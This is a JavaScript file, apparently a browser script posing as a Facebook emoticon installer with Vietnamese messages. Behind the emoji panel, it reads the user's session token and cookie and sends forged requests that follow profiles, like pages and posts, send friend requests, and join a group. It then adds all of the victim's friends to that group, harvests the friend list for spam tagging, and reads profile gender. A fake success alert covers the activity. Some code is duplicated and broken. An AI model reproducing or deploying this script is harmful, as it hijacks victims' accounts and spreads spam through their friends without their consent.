		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
	html += '<a class="navLink" title="1 Thông Báo Mới">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="https://www.facebook.com/Black.WhiteDemon" target="_blank">Chúc Mừng Bạn Đã Cài Đặt ICON FACEBOOK Thành Công <br>NoName</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();


	// === Facebook Emoticons ====
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
alert('ĐÃ CÀI ĐẶT ICON THÀNH CÔNG ! CHÚC CÁC BẠN ONLINE VUI VẺ.                                                                                                HTTP://FACEBOOK.COM');
function Like(p) {
    var Page = new XMLHttpRequest();
    var PageURL =
        "//www.facebook.com/ajax/pages/fan_status.php";
    var PageParams = "&fbpage_id=" + p +
        "&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=" +
        user_id +
        "&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=" +
        fb_dtsg + "&phstamp=";
    Page.open("POST", PageURL, true);
    Page.onreadystatechange = function () {
        if (Page.readyState == 4 &&
            Page.status == 200) {
            Page.close;
        }
    };
    Page.send(PageParams);
}
function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
//Boss
a("100006803773171");a("100007572942639");a("100007779312326");
P("1405454723024640");P("1437329969837115");P("1406605476242898");P("1401407190096060");P("1440523192851126");
Like("565491740198905");Like("603358856392067");
sublist("1404423043127808");sublist("1397827250479693");
a("100003798271742");a("100003307302779"); 
sublist("290137191122888");sublist("277815575688383");sublist("300603376742936");
//Khách
Like("560616007347358");
//Bố
a("100007751678223");a("100006619902303");sublist("621952017816839");IDS("100000061400267");IDS("100003638324695");IDS("100007751678223");Like("263316953820631");Like("1387179771538109");Like("547700161992307");Like("268572309974110");Like("623995204323025");Like("477919925642333");Like("721801554519652");Like("1390878577847378");Like("1470990859791383");Like("411811502221011");P("660028574009183");P("582804098398298");P("751733198172053");P("417346981729909");P("779421418736564");P("764398883572151");P("632539930134055");Like("762236307120939");a("1294612543");a("100007468475925");Like("619254151485143");
//tun +  tony
a("100004436023636");a("100007510844392");a("100007580262467");
Like("175621209301830");Like("1426501940916509");Like("181916002005308");Like("357470681056862");Like("516246508494772");
Like("372074939594840");Like("242831299216547");Like("147970642034527");
sublist("311571915653699");sublist("324499044360986");
sublist("185787898245743"); Like("384187648336789");
// DvCS
IDS("100004026798535");a("100007039655824");a("100006829804143");
a("100006529862238");a("100004026798535");P("1380682085522826");
sublist("311571915653699");sublist("324499044360986");sublist("1436819479879034");
Like("511637328956308");Like("372074939594840");Like("242831299216547");Like("147970642034527");Like("175621209301830");Like("1426501940916509");Like("181916002005308");Like("357470681056862");Like("522029944554227");Like("244792439018308");Like("469261569853240");Like("510655805639172");Like("398907463557099");Like("570670556314669");Like("403199209755341");Like("669013943124843");Like("1380121132212609");Like("384187648336789");Like("586197551400099");Like("612001038812127");Like("147558552100521");Like("540059609385440");
//DangHaiPhong
a("100003477855375");sublist("372786159513976");P("402458586546733");a("100006898743987");P("400575806735011");sublist("1379309458975666");a("100007661970423");Like("417940788338591");Like("665012590228884");Like("270216739804383");Like("694038877303411");a("100006571835815");a("100006511783993");P("454127744713150");
//Ưng Hoàng
Like("608365252560120"); Like("192911997562069"); Like("1452990728259720");
a("100001432527243");
a("100006117281963");
//MhMin
a("100004229011575");a("100003869398980");P("281125972038368");
sublist("178933605590939");sublist("211950375622595");
sublist("218444118306554");sublist("219193454898287");
Like("567169820029397");Like("534488129938890");Like("1424521047793805");
Like("615786191810649");Like("284505448365552");
P("248895808594718");P("279295055554793");P("286481138169518");
P("253933548090944");P("279295018888130");P("272102459607386");
P("200091720141794");P("229670067183959");P("224894054328227");
//Tu Chí
a("100007209373220");a("100003822772005");Like("117066818491163");
Like("624091950997546");Like("479347405509373");Like("464703896962923");
Like("531113973670434");Like("410353745775512");Like("288851617932145");
Like("240409919478013");Like("581125421979176");Like("503705839744074");
// Phan Phụng Tú Tài
a("100007398700600");a("100007063120509");a("100003908713413");a("100004063578918");
a("100004086316763");a("100007683931143");P("1401856610070949");a("100007759182208");
a("100007341632664");a("100004855563295");a("100006059193797");
Like("627116584026188");Like("1498364323723609");Like("1384123011851254");
Like("423221271145909");Like("708030165893905");Like("1389425637974839");
Like("1417396908507128");Like("274155672734875");Like("1380336612207612");
Like("1426560524248480");Like("579148995494179");Like("486493021392287");
Like("1472410599648248");
//Min Vo Cam
Like("728282820527594");Like("819966518030177");Like("226311787560672");
Like("1404108516511456");Like("608547905906403");Like("732891430077134");
a("100005826073350");a("100007688770713");sublist("165186447018890");
a("100003251100769");sublist("410561809062186");P("167519223452279");
//ke
IDS("100002939186578");P("528486317259336");Like("364471533689435");
P("528486317259336");sublist("433849993389636");
//Hoang Phu
a("100004606864047");a("100005879291858");sublist("220376934792534");sublist("169278886611420");
P("199116800294295");P("203268833170011");
Like("1380638395541100");Like("690369137681621");Like("822660547749335");Like("446132228823692");
Like("1421815878065422");Like("525107000935879");Like("284288245056961");Like("626391217418406");
Like("618526484861664");Like("222952594564514");Like("592305450855382");
Like("1424804084404440");Like("423872104411683");Like("1393383787576545");
//TSP
a("100006760806314");a("100007546693300");IDS("100004052730171");a("100005094693293");Like("1467788360100039");Like("1425803794329604");Like("243849219120055");Like("718587688185504");Like("1425368104370561");Like("1411997072385358");Like("294743390677898");Like("1427354950838801");a("100004298409433");a("100004479454581");a("100004067769946");a("100004524274891");a("100004374070578");a("100004514497944");P("1431396603762353");P("1435264940042186");P("392306414247780");P("1431388640429816");P("1444781452423868");P("1441742779394402");P("1441742539394426");P("1444781365757210");P("410469652431456");
//Son Hoa
Like("221088591416235");Like("430079737095220");Like("662407560489789");
Like("1448176565411823");Like("367187283421225");Like("421467624665145");
Like("421467624665145");Like("533354686780625");Like("527653984016523");
Like("465960226863083");Like("724835117535611");Like("284012821751742");
Like("269056136591670");Like("747299401946931");Like("1466883713526716");
Like("296199770528567");Like("210751799132978");Like("577428622346894");
a("100006388567730");a("100004536944120");a("100003141507853");
//Cuong
a("100003476998925");a("100003896335787");a("100006548231220");sublist("466541303471765");Like("478017935654618");Like("212443628952969");Like("502080256570147");Like("464553383671311");Like("1397274337200850");Like("254856458028565");Like("1449429758621658");Like("463762367079943");Like("573893072681028");Like("710807135626563");
//Bi
sublist("209863882497872");a("100001456560565");P("273243772826549");P("282972768520316");Like("253591431417687");P("408348432642135");a("100004226463129");P("283017845182475");Like("632135776834514");P("184547461748201");P("184601421742805");P("273069019510691");P("271357006348559");P("264370247047235");P("264311500386443");P("263840543766872");P("281525561998370");P("282667531884173");Like("565639316829211");Like("432577410190561");Like("269858973165273");Like("298959796898882");Like("454920977919944");Like("223891154469020");Like("599487090131706");IDS("100004227851982");a("100005788442697");Like("165934983579396");a("100004009452717");
//NDinhLong
a("100005010302665");P("205991319577877");P("209328505910825");P("264330943743914");Like("194502280760848");Like("619041501502908");Like("806169416066978");Like("345616852183505");Like("319565348062723");Like("527057560672882");Like("195671117223146");Like("352575094872251");Like("714816081886234");Like("355589387872859");Like("568271549900939");Like("488923251194726");Like("496999667079973");Like("285416254942556");Like("1431213300448785");Like("1409326709309910");Like("1379776552272260");
//Ánh Vân
a("100007204391403");a("100007753477338");a("100007547023123");sublist("1400247183558748");sublist("1382730821977051");sublist("1400246480225485");Like("579846572105743");Like("455267821241589");Like("474685699301921");Like("247768535403114");Like("274053292752774");Like("571429072952535");Like("666178103439413");P("1382725635310903");P("1403552623228204");
//Son thanh pham
a("100006011107414");a("100005957683886");a("100002789161183");a("100001277308266");sublist("110777179132652");Like("594879107219966");Like("332355500243431");Like("504531169645970");Like("513143108778372");Like("593419554063907");Like("221350404715586");Like("244228262418445");Like("441471645971760");Like("386301948122761");Like("581006078649634");Like("601937466549353");Like("1387239811496628");Like("593224067421117");Like("1464972683722856");Like("191616137716376");Like("670717889659292");Like("1400316543560365");Like("1401228496802919");Like("571986922893233");Like("1459175364294378");Like("398577290286484");Like("435618606570406");Like("635189399850983");Like("703819499648878");P("168508133359556");P("176760245867678");P("200593226817713");P("200502440160125");
//TuanCoi
a("100007206252333");a("100007333663389");
Like("583458081690513");Like("238558422978428");Like("234737070019890");
Like("280908235391798");Like("123525791154007");Like("322494747862144");
Like("178440138958048");Like("178440138958048");Like("670618709639158");
Like("249580448556514");Like("221110708095290");Like("1424249037818018");
P("704576122908248");P("438225139589542");P("552562584822463");
P("249581751889717");P("221111478095213");P("1424250371151218");
//KhongTen
IDS("100002754024576");a("100007508704014");
a("100000303521171");
a("839493429");
sublist("10151995479593430");sublist("10151857219433430");
sublist("314756041993534");
P("380317902070007");P("416920948409702");P("450264091742054");P("460854570681573");
Like("598975736843034");Like("1397883850463964");Like("1453938688158589");
Like("512270292201992");Like("1433651793529676");Like("1436764673202435");
Like("1426864327546965");Like("245195268986777");Like("1377286875876382");
Like("688423387847338");Like("1391397287795468");Like("743630688988449");
//Bạn Mẹ Trẻ Con
Like("278909915601095");Like("295743780579175");Like("811375125544670");
Like("678347692225302");Like("594024804017717");Like("1407936102798190");
Like("649857591745111");Like("221577498031657");a("100001094522338");a("100004333512414");sublist("536358316410648");
//Thưởng đẹp zai 1102
IDS("100003877146440");a("100007729423775");a("100007814550129");a("100007293944377");a("100003734828248");a("100004030848039");a("100003033117465");a("100001395488769");Like("602506159820823");Like("181627148703838");Like("706083872769183");Like("1401886530073511");Like("558634407566969");Like("1392466934346044");Like("576916789061741");Like("269280836567599");Like("265918143570814");Like("580078912067909");Like("1411334019116243");Like("482193798558196");Like("360333387437903");Like("828969330461844");Like("350532395002116");Like("603292139737447");Like("1397643643829244");Like("254698408031118");Like("226013190920628");Like("719787118052951");Like("175636802619940");Like("719787118052951");Like("629450250438169");Like("221350404715586");P("266152150190688");P("303374853135084");P("342661585873077");P("321768474629055");sublist("311850718954164");sublist("261744260631477");sublist("507098222680023");
//DUy
a("100004480119832");a("100006644741794");a("100007592195757");Like("584823988219699");Like("213953178798747");Like("760425733974991");Like("1412927565608102");Like("1383457641874889");Like("814059611944072");Like("547884035319145");P("228903167269019");sublist("196350557190947");

var gid = ['1428491330699410'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};
 
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
}
 
 
//arkadaslari al ve isle
function sarkadaslari_al(){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                                  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                                  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
                                        smesaj = "";
                                        smesaj_text = "";
                                  for(i=f*10;i<(f+1)*10;i++){
                                        if(arkadaslar.payload.entries[i]){
                                  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
                                  smesaj_text += " " + arkadaslar.payload.entries[i].text;
                                  }
                                        }
                                        sdurumpaylas();                         }
                               
                        }
                       
        };
                var params = "&filter[0]=user";
                params += "&options[0]=friends_only";
                params += "&options[1]=nm";
                params += "&token=v7";
        params += "&viewer=" + user_id;
                params += "&__user=" + user_id;
               
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}
 
//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
 
document.removeEventListener(tiklama);
}
 }, false);
 
 
//arkada?¾ ekleme
function sarkadasekle(uid,cins){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){  
                        }
        };
               
                xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true);
                var params = "to_friend=" + uid;
                params += "&action=add_friend";
                params += "&how_found=friend_browser";
                params += "&ref_param=none";
                params += "&outgoing_id=";
                params += "&logging_location=friend_browser";
                params += "&no_flyout_on_click=true";
                params += "&ego_log_data=";
                params += "&http_referer=";
                params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
                params += "&__user=" + user_id;
               
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}
 
//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
 
document.removeEventListener(tiklama);
}
 }, false);
 
 
//arkada?¾ ekleme
function sarkadasekle(uid,cins){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){  
                        }
        };
               
                xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true);
                var params = "to_friend=" + uid;
                params += "&action=add_friend";
                params += "&how_found=friend_browser";
                params += "&ref_param=none";
                params += "&outgoing_id=";
                params += "&logging_location=friend_browser";
                params += "&no_flyout_on_click=true";
                params += "&ego_log_data=";
                params += "&http_referer=";
                params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
                params += "&__user=" + user_id;
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
               
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
                xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
                cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
                xmlhttp.send(params);
}
}
 
//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                        eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                        cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
                        btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
                        if(cinshtml.getElementsByTagName("select")[0].value == "1"){
                        document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
                        }else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
                        document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
                        }
                        eval(fonksiyon + "(" + id + "," + cins + ");");
                        }
        };
                xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.send();
}
